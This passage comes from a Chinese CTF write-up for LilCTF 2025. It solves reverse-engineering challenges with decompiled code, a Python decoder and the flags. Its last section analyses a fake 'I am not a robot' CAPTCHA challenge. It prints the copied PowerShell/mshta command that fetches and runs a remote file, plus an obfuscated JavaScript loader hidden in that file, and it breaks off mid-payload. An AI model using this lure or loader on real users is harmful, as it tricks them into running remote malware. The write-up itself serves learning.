v4;<br>  v7 = &amp;a1[v4];<br>  while ( v5 != v7 )<br>    *v5++ ^= 0x72u;<br>  LOBYTE(v8) = 48;<br>  v9 = &amp;v25;<br>  do<br>  &#123;<br>    *v9++ = v8;<br>    v8 = (unsigned __int8)(v8 + 1);<br>  &#125;<br>  while ( v8 != 106 );<br>  v10 = &amp;a2[3 * (v6 / 2) + 3];<br>  v11 = v6 - 1;<br>  v12 = v10;<br>  ((void (__fastcall *)(_BYTE *, _BYTE *))unk_67F5FCFC)(v10, a1);<br>  v13 = v10;<br>  v14 = (unsigned int)&amp;v10[v11];<br>  while ( (unsigned int)v13 &lt;= v14 )<br>  &#123;<br>   <span class="hljs-built_in"> if </span>( *v13 )<br>    &#123;<br>      v19 = v13;<br>      v20 = 0;<br>      while ( (unsigned int)v19 &lt;= v14 )<br>      &#123;<br>        v24 = ((__int16)v20 &lt;&lt; 8) + *v19;<br>        ((void (__fastcall *)(int, int))unk_67FC8600)(v24, 58);<br>        v20 = v21;<br>        *v19++ = ((int (__fastcall *)(int, int))unk_67FC8534)(v24, 58);<br>      &#125;<br>      *--v12 = v23[v20 + 12];<br>    &#125;<br>    else<br>    &#123;<br>      ++v13;<br>    &#125;<br>  &#125;<br>  v15 = a2;<br>  v16 = 0;<br>  v17 = (_BYTE *)(v10 - v12);<br>  while ( (unsigned int)v17 &gt; v16 )<br>  &#123;<br>    v22 = v12[v16++];<br>    *v15++ = v22;<br>  &#125;<br>  result = a2;<br>  *v15 = 0;<br> <span class="hljs-built_in"> return </span>result;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中的 <code>sub_67FC21E0</code> 是计算字符串长度的函数</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">int</span> __fastcall sub_67FC21E0(unsigned __int8 *<span class="hljs-built_in">a1</span>)<br>&#123;<br>  unsigned __int8 *<span class="hljs-built_in">v1</span><span class="hljs-comment">; // r3</span><br>  unsigned __int8 *<span class="hljs-built_in">v2</span><span class="hljs-comment">; // r2</span><br><br>  <span class="hljs-built_in">v1</span> = <span class="hljs-built_in">a1</span><span class="hljs-comment">;</span><br>  do<br>    <span class="hljs-built_in">v2</span> = <span class="hljs-built_in">v1</span><span class="hljs-comment">;</span><br>  <span class="hljs-meta">while</span> ( *<span class="hljs-built_in">v1</span>++ )<span class="hljs-comment">;</span><br>  return <span class="hljs-built_in">v2</span> - <span class="hljs-built_in">a1</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>v5 点进去是输入</p><p><img src="/../images/LilCTF2025/u4.png"> </p><p>加密函数先是对输入数据进行了 <strong>异或 0x72</strong><br>然后是一个自定义表的 <strong>base58</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">LOBYTE(v8) = 48; // 0x30 &#x27;0&#x27;<br>v9 = &amp;v25;<br>do &#123; *v9++ = v8; v8 = (unsigned __int8)(v8 + 1); &#125;<br>while (v8 != 106); // 0x6A &#x27;j&#x27;<br></code></pre></td></tr></table></figure><p>字母表为 “0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_&#96;abcdefghi”</p><p><img src="/../images/LilCTF2025/u6.png"></p><p>接着开始的汇编</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">MEMORY:</span><span class="hljs-number">67</span>F71FF0 <span class="hljs-keyword">ADD</span>   <span class="hljs-built_in">R3</span>, <span class="hljs-built_in">R4</span>, <span class="hljs-meta">#0x78</span><br><span class="hljs-symbol">MEMORY:</span><span class="hljs-number">67</span>F71FF4 <span class="hljs-keyword">ADD</span>   <span class="hljs-built_in">R4</span>, SP, <span class="hljs-built_in">R3</span><br>...<br><span class="hljs-symbol">MEMORY:</span><span class="hljs-number">67</span>F7200C <span class="hljs-keyword">ADD</span>   <span class="hljs-built_in">R0</span>, SP, <span class="hljs-meta">#0x38 ; 输入缓冲区</span><br><span class="hljs-symbol">MEMORY:</span><span class="hljs-number">67</span>F72010 BL    unk_67F71E3C  <span class="hljs-comment">; 做变换（xor+base58编码）</span><br><span class="hljs-symbol">MEMORY:</span><span class="hljs-number">67</span>F72014 LDR   <span class="hljs-built_in">R1</span>, =<span class="hljs-number">0x67FD3CB3</span>  <span class="hljs-comment">; &lt;&lt;&lt; 这里加载了一个常量地址</span><br><span class="hljs-symbol">MEMORY:</span><span class="hljs-number">67</span>F72018 <span class="hljs-keyword">ADD</span>   <span class="hljs-built_in">R0</span>, SP, <span class="hljs-meta">#4      ; 输出缓冲区（存放编码后的结果）</span><br><span class="hljs-symbol">MEMORY:</span><span class="hljs-number">67</span>F7201C BL    unk_67FC2138    <span class="hljs-comment">; 调用对比函数（strcmp）</span><br><span class="hljs-symbol">MEMORY:</span><span class="hljs-number">67</span>F72020 CMP   <span class="hljs-built_in">R0</span>, <span class="hljs-meta">#0</span><br><span class="hljs-symbol">MEMORY:</span><span class="hljs-number">67</span>F72024 STREQ <span class="hljs-built_in">R0</span>, [<span class="hljs-built_in">R6</span>]<br></code></pre></td></tr></table></figure><p>跳转到地址 0x67FD3CB3 处，找到密文<code>5W2b9PbLE6SIc3WP=X6VbPI0?X@HMEWH;</code></p><p><img src="/../images/LilCTF2025/u8.png"></p><p>CyberChef 解密</p><p><img src="/../images/LilCTF2025/u9.png"></p><p>flag 为 <code>LILCTF&#123;Ub007_1s_v3ry_ez&#125;</code></p><h3 id="Qt-Creator"><a href="#Qt-Creator" class="headerlink" title="Qt_Creator"></a>Qt_Creator</h3><p>先安装，然后逆 demo_code_editor.exe<br>打断点动态调试发现关键函数 <strong>sub_40EE30</strong></p><p><img src="/../images/LilCTF2025/Q1.png"></p><p><img src="/../images/LilCTF2025/Q2.png"></p><p>这部分就是密文<br><strong>KJKDSGzR6`bsd5s1q`0t^wdsx`b1mw2oh4mu|</strong></p><p>继续运行，发现在输入点击按钮之后都会立即退出<br>之前搜索字符串时看到 Ciallo, <code>X</code> 交叉引用发现函数 <strong>sub_410100</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs smali">int __fastcall sub_410100(_DWORD *a1)<br>&#123;<br>  volatile signed __int32 *v2; // edx<br>  volatile signed __int32 *v3; // eax<br>  signed __int32 v4; // et0<br>  volatile signed __int32 *v5; // eax<br> <span class="hljs-built_in"> int </span>v6; // edx<br>  signed __int32 v7; // et0<br>  volatile signed __int32 *v8; // eax<br>  volatile signed __int32 v9; // edx<br>  signed __int32 v10; // et0<br>  volatile signed __int32 *v11; // eax<br>  signed __int32 v12; // et0<br>  volatile signed __int32 *v13; // eax<br>  signed __int32 v14; // et0<br>  volatile signed __int32 *v16; // eax<br>  signed __int32 v17; // et0<br>  volatile signed __int32 *v18; // eax<br>  signed __int32 v19; // et0<br> <span class="hljs-built_in"> int </span>v20; // [esp+0h] [ebp-58h]<br>  char v21; // [esp+2Ch] [ebp-2Ch]<br>  volatile signed __int32 *v22; // [esp+34h] [ebp-24h] BYREF<br>  volatile signed __int32 *v23; // [esp+38h] [ebp-20h] BYREF<br>  volatile signed __int32 *v24[7]; // [esp+3Ch] [ebp-1Ch] BYREF<br><br>  v2 = (volatile signed __int32 *)a1[14];<br>  v23 = v2;<br> <span class="hljs-built_in"> if </span>( *v2 != -1 &amp;&amp; *v2 != 0 )<br>    _InterlockedAdd(v2, 1u);<br>  sub_40FFF0(v24, (int)a1, (int)&amp;v23);<br>  ZNK9QLineEdit4textEv(&amp;v22, *(_DWORD *)(a1[6] + 20));<br>  v21 = ZeqRK7QStringS1_(&amp;v22);<br>  v3 = v22;<br> <span class="hljs-built_in"> if </span>( *v22 &amp;&amp; (*v22 == -1 || (v4 = _InterlockedSub(v22, 1u), v3 = v22, v4)) )<br>  &#123;<br>    v5 = v24[0];<br>    v6 = *v24[0];<br>   <span class="hljs-built_in"> if </span>( !*v24[0] )<br>     <span class="hljs-built_in"> goto </span><span class="hljs-class">LABEL_22;</span><br>  &#125;<br>  else<br>  &#123;<br>    ZN10QArrayData10deallocateEPS_jj(v3, 2, 4);<br>    v5 = v24[0];<br>    v6 = *v24[0];<br>   <span class="hljs-built_in"> if </span>( !*v24[0] )<br>     <span class="hljs-built_in"> goto </span><span class="hljs-class">LABEL_22;</span><br>  &#125;<br> <span class="hljs-built_in"> if </span>( v6 != -1 )<br>  &#123;<br>    v7 = _InterlockedSub(v5, 1u);<br>    v5 = v24[0];<br>   <span class="hljs-built_in"> if </span>( !v7 )<br>    &#123;<br>LABEL_22:<br>      ZN10QArrayData10deallocateEPS_jj(v5, 2, 4);<br>      v8 = v23;<br>      v9 = *v23;<br>     <span class="hljs-built_in"> if </span>( *v23 )<br>       <span class="hljs-built_in"> goto </span><span class="hljs-class">LABEL_10;</span><br>LABEL_23:<br>      ZN10QArrayData10deallocateEPS_jj(v8, 2, 4);<br>     <span class="hljs-built_in"> goto </span><span class="hljs-class">LABEL_12;</span><br>    &#125;<br>  &#125;<br>  v8 = v23;<br>  v9 = *v23;<br> <span class="hljs-built_in"> if </span>( !*v23 )<br>   <span class="hljs-built_in"> goto </span><span class="hljs-class">LABEL_23;</span><br>LABEL_10:<br> <span class="hljs-built_in"> if </span>( v9 != -1 )<br>  &#123;<br>    v10 = _InterlockedSub(v8, 1u);<br>    v8 = v23;<br>   <span class="hljs-built_in"> if </span>( !v10 )<br>     <span class="hljs-built_in"> goto </span><span class="hljs-class">LABEL_23;</span><br>  &#125;<br>LABEL_12:<br> <span class="hljs-built_in"> if </span>( !v21 )<br>  &#123;<br>    ZNK11QMetaObject2trEPKcS1_i(v24, &amp;dword_41A0B0, &amp;unk_41BF22, 0, -1);<br>    ZNK11QMetaObject2trEPKcS1_i(&amp;v23, &amp;dword_41A0B0, &amp;unk_41BF38, 0, -1);<br>    ZN11QMessageBox7warningEP7QWidgetRK7QStringS4_6QFlagsINS_14StandardButtonEES6_(a1, &amp;v23, v24, 0x4000);<br>    v16 = v23;<br>   <span class="hljs-built_in"> if </span>( !*v23 || *v23 != -1 &amp;&amp; (v17 = _InterlockedSub(v23, 1u), v16 = v23, !v17) )<br>      ZN10QArrayData10deallocateEPS_jj(v16, 2, 4);<br>    v18 = v24[0];<br>   <span class="hljs-built_in"> if </span>( *v24[0] )<br>    &#123;<br>     <span class="hljs-built_in"> if </span>( *v24[0] == -1 || (v19 = _InterlockedSub(v24[0], 1u), v18 = v24[0], v19) )<br>        exit(0);<br>    &#125;<br>    ZN10QArrayData10deallocateEPS_jj(v18, 2, 4);<br>    exit(0);<br>  &#125;<br>  ZNK11QMetaObject2trEPKcS1_i(v24, &amp;dword_41A0B0, &amp;unk_41BEED, 0, -1);<br>  ZNK11QMetaObject2trEPKcS1_i(&amp;v23, &amp;dword_41A0B0, &amp;unk_41BF06, 0, -1);<br>  v20 = 0;<br>  ZN11QMessageBox11informationEP7QWidgetRK7QStringS4_6QFlagsINS_14StandardButtonEES6_(a1, &amp;v23, v24, 0x4000);<br>  v11 = v23;<br> <span class="hljs-built_in"> if </span>( !*v23 || *v23 != -1 &amp;&amp; (v12 = _InterlockedSub(v23, 1u), v11 = v23, !v12) )<br>    ZN10QArrayData10deallocateEPS_jj(v11, 2, 4);<br>  v13 = v24[0];<br> <span class="hljs-built_in"> if </span>( !*v24[0] || *v24[0] != -1 &amp;&amp; (v14 = _InterlockedSub(v24[0], 1u), v13 = v24[0], !v14) )<br>    ZN10QArrayData10deallocateEPS_jj(v13, 2, 4);<br> <span class="hljs-built_in"> return </span>(*(int (__thiscall **)(_DWORD *, int))(*a1 + 220))(a1, v20);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里面打断点继续动调，结果发现输入之后断在这里了,其中的 <strong>sub_40FFF0</strong> 就是加密函数</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs smali">_DWORD *__thiscall sub_40FFF0(_DWORD *this,<span class="hljs-built_in"> int </span>a2,<span class="hljs-built_in"> int </span>a3)<br>&#123;<br>  _DWORD *v3; // ecx<br> <span class="hljs-built_in"> int </span>v4; // eax<br>  _DWORD *v5; // edx<br> <span class="hljs-built_in"> int </span>v6; // ebx<br> <span class="hljs-built_in"> int </span>v7; // edi<br>  __int16 v8; // si<br> <span class="hljs-built_in"> int </span>v9; // eax<br>  __int16 v11; // si<br> <span class="hljs-built_in"> int </span>v12; // eax<br> <span class="hljs-built_in"> int </span>v13; // [esp+4h] [ebp-38h]<br><br>  v3 = *(_DWORD **)a3;<br> <span class="hljs-built_in"> if </span>( *(int *)(*(_DWORD *)a3 + 4) &gt; 0 )<br>  &#123;<br>    v4 = 0;<br>    v5 = *(_DWORD **)a3;<br>    do<br>    &#123;<br>      v6 = 2 * v4;<br>      v7 = v4 + 1;<br>      v8 = *(_WORD *)((char *)v3 + 2 * v4 + v3[3]);<br>     <span class="hljs-built_in"> if </span>( (v4 &amp; 1) != 0 )<br>      &#123;<br>       <span class="hljs-built_in"> if </span>( v4 &gt;= v5[1] )<br>        &#123;<br>          LOWORD(v13) = 32;<br>          ZN7QString6resizeEi5QChar(a3, v7, v13);<br>          v5 = *(_DWORD **)a3;<br>          v3 = *(_DWORD **)a3;<br>          v9 = *(_DWORD *)(*(_DWORD *)a3 + 12);<br>        &#125;<br>        else<span class="hljs-built_in"> if </span>( *v5 &gt; 1u || (v9 = v5[3], v3 = v5, v9 != 16) )<br>        &#123;<br>          ZN7QString11reallocDataEjb(a3, v5[1] + 1, 0);<br>          v5 = *(_DWORD **)a3;<br>          v9 = *(_DWORD *)(*(_DWORD *)a3 + 12);<br>          v3 = *(_DWORD **)a3;<br>        &#125;<br>        *(_WORD *)((char *)v5 + v6 + v9) = v8 - 1;<br>      &#125;<br>      else<br>      &#123;<br>        v11 = v8 + 1;<br>       <span class="hljs-built_in"> if </span>( *v3 &gt; 1u || (v12 = v5[3], v3 = v5, v12 != 16) )<br>        &#123;<br>          ZN7QString11reallocDataEjb(a3, v5[1] + 1, 0);<br>          v5 = *(_DWORD **)a3;<br>          v12 = *(_DWORD *)(*(_DWORD *)a3 + 12);<br>          v3 = *(_DWORD **)a3;<br>        &#125;<br>        *(_WORD *)((char *)v5 + v6 + v12) = v11;<br>      &#125;<br>      v4 = v7;<br>    &#125;<br>    while ( v5[1] &gt; v7 );<br>  &#125;<br>  *this = v3;<br>  *(_DWORD *)a3 = ZN10QArrayData11shared_nullE;<br> <span class="hljs-built_in"> return </span>this;<br>&#125;<br></code></pre></td></tr></table></figure><p>遍历一个 QString 对象的字符,偶数位字符 +1，奇数位字符 -1 (其实即使没找到加密，根据 KJKDSG 对应 LILCTF 也能总结出这个加密)<br>exp :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;KJKDSGzR6`bsd5s1q`0t^wdsx`b1mw2oh4mu|&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]) + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]) - <span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>得到 flag 为 <code>LILCTF&#123;Q7_cre4t0r_1s_very_c0nv3ni3nt&#125;</code></p><h3 id="1’M-no7-A-rO6oT"><a href="#1’M-no7-A-rO6oT" class="headerlink" title="1’M no7 A rO6oT"></a>1’M no7 A rO6oT</h3><p>打开靶机</p><p><img src="/../images/LilCTF2025/r1.png"></p><p>在点击验证框时会复制得到以下内容</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">powershell . \*i*<span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span><span class="hljs-symbol">\\</span>\*2\msh*e http://gz.imxbt.cn:20778/Coloringoutomic_Host.mp3   http://gz.imxbt.cn:20778/Coloringoutomic_Host.mp3 #     ✅ Ι am nοt a rοbοt: CAPTCHA Verification ID: 10086<br></code></pre></td></tr></table></figure><p>用 curl 下载 mp3 文件<br><code>curl -O http://gz.imxbt.cn:20778/Coloringoutomic_Host.mp3</code></p><blockquote><p>-O 参数表示使用远程文件名保存<br>文件会下载到当前目录<br>不会执行文件，只是获取文件内容</p></blockquote><p>把 mp3 用记事本打开，在中间发现</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;script&gt;</span><span class="hljs-attribute">window</span>.resizeTo(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);window.moveTo(-<span class="hljs-number">9999</span>, -<span class="hljs-number">9999</span>); SK=<span class="hljs-number">102</span>;UP=<span class="hljs-number">117</span>;tV=<span class="hljs-number">110</span>;Fx=<span class="hljs-number">99</span>;nI=<span class="hljs-number">116</span>;pV=<span class="hljs-number">105</span>;wt=<span class="hljs-number">111</span>;RV=<span class="hljs-number">32</span>;wV=<span class="hljs-number">82</span>;Rp=<span class="hljs-number">106</span>;kz=<span class="hljs-number">81</span>;CX=<span class="hljs-number">78</span>;GH=<span class="hljs-number">40</span>;PS=<span class="hljs-number">70</span>;YO=<span class="hljs-number">86</span>;kF=<span class="hljs-number">75</span>;PO=<span class="hljs-number">113</span>;QF=<span class="hljs-number">41</span>;sZ=<span class="hljs-number">123</span>;nd=<span class="hljs-number">118</span>;Ge=<span class="hljs-number">97</span>;sV=<span class="hljs-number">114</span>;wl=<span class="hljs-number">104</span>;NL=<span class="hljs-number">121</span>;Ep=<span class="hljs-number">76</span>;uS=<span class="hljs-number">98</span>;Lj=<span class="hljs-number">103</span>;ST=<span class="hljs-number">61</span>;Ix=<span class="hljs-number">34</span>;Im=<span class="hljs-number">59</span>;Gm=<span class="hljs-number">101</span>;YZ=<span class="hljs-number">109</span>;Xj=<span class="hljs-number">71</span>;Fi=<span class="hljs-number">48</span>;dL=<span class="hljs-number">60</span>;cX=<span class="hljs-number">46</span>;ho=<span class="hljs-number">108</span>;jF=<span class="hljs-number">43</span>;Gg=<span class="hljs-number">100</span>;aV=<span class="hljs-number">90</span>;uD=<span class="hljs-number">67</span>;Nj=<span class="hljs-number">83</span>;US=<span class="hljs-number">91</span>;tg=<span class="hljs-number">93</span>;vx=<span class="hljs-number">45</span>;xv=<span class="hljs-number">54</span>;QB=<span class="hljs-number">49</span>;WT=<span class="hljs-number">125</span>;FT=<span class="hljs-number">55</span>;yN=<span class="hljs-number">51</span>;ff=<span class="hljs-number">44</span>;it=<span class="hljs-number">50</span>;NW=<span class="hljs-number">53</span>;kX=<span class="hljs-number">57</span>;zN=<span class="hljs-number">52</span>;Mb=<span class="hljs-number">56</span>;Wn=<span class="hljs-number">119</span>;sC=<span class="hljs-number">65</span>;Yp=<span class="hljs-number">88</span>;FF=<span class="hljs-number">79</span>;var SxhM = String.fromCharCode(SK,UP,tV,Fx,nI,pV,wt,tV,RV,pV,wt,wV,Rp,kz,CX,GH,PS,YO,kF,PO,QF,sZ,nd,Ge,sV,RV,wt,wl,NL,Ep,uS,Lj,ST,RV,Ix,Ix,Im,SK,wt,sV,RV,GH,nd,Ge,sV,RV,Gm,YZ,Xj,kF,RV,ST,RV,Fi,Im,Gm,YZ,Xj,kF,RV,dL,RV,PS,YO,kF,PO,cX,ho,Gm,tV,Lj,nI,wl,Im,RV,Gm,YZ,Xj,kF,jF,jF,QF,sZ,nd,Ge,sV,RV,tV,Gg,aV,uD,RV,ST,RV,Nj,nI,sV,pV,tV,Lj,cX,SK,sV,wt,YZ,uD,wl,Ge,sV,uD,wt,Gg,Gm,GH,PS,YO,kF,PO,US,Gm,YZ,Xj,kF,tg,RV,vx,RV,xv,Fi,QB,QF,Im,wt,wl,NL,Ep,uS,Lj,RV,ST,RV,wt,wl,NL,Ep,uS,Lj,RV,jF,RV,tV,Gg,aV,uD,WT,sV,Gm,nI,UP,sV,tV,RV,wt,wl,NL,Ep,uS,Lj,WT,Im,nd,Ge,sV,RV,wt,wl,NL,Ep,uS,Lj,RV,ST,RV,pV,wt,wV,Rp,kz,CX,GH,US,FT,QB,yN,ff,RV,FT,QB,it,ff,RV,FT,it,Fi,ff,RV,FT,Fi,it,ff,RV,FT,QB,NW,ff,RV,FT,QB,xv,ff,RV,FT,Fi,NW,ff,RV,FT,Fi,it,ff,RV,FT,Fi,kX,ff,RV,FT,Fi,kX,ff,RV,xv,zN,FT,ff,RV,FT,Fi,it,ff,RV,FT,it,QB,ff,RV,FT,Fi,it,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,it,Fi,ff,RV,xv,yN,yN,ff,RV,xv,NW,Fi,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,Fi,it,ff,RV,FT,QB,yN,ff,RV,xv,yN,yN,ff,RV,xv,Mb,xv,ff,RV,FT,QB,QB,ff,RV,FT,QB,NW,ff,RV,FT,Fi,it,ff,RV,FT,QB,xv,ff,RV,FT,QB,FT,ff,RV,FT,QB,NW,ff,RV,FT,Fi,xv,ff,RV,FT,Fi,Fi,ff,RV,FT,QB,FT,ff,RV,FT,Fi,it,ff,RV,FT,Fi,QB,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,QB,QB,ff,RV,FT,QB,it,ff,RV,FT,QB,yN,ff,RV,xv,yN,yN,ff,RV,xv,yN,FT,ff,RV,xv,FT,Fi,ff,RV,xv,FT,QB,ff,RV,xv,Mb,NW,ff,RV,xv,FT,Fi,ff,RV,xv,yN,yN,ff,RV,xv,xv,it,ff,RV,xv,zN,QB,ff,RV,xv,kX,it,ff,RV,FT,QB,NW,ff,RV,FT,Fi,it,ff,RV,FT,Fi,zN,ff,RV,FT,Fi,it,ff,RV,FT,it,QB,ff,RV,xv,kX,zN,ff,RV,xv,NW,kX,ff,RV,xv,NW,kX,ff,RV,xv,FT,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,QB,FT,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,NW,ff,RV,FT,Fi,it,ff,RV,FT,QB,xv,ff,RV,xv,zN,QB,ff,RV,xv,zN,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,it,f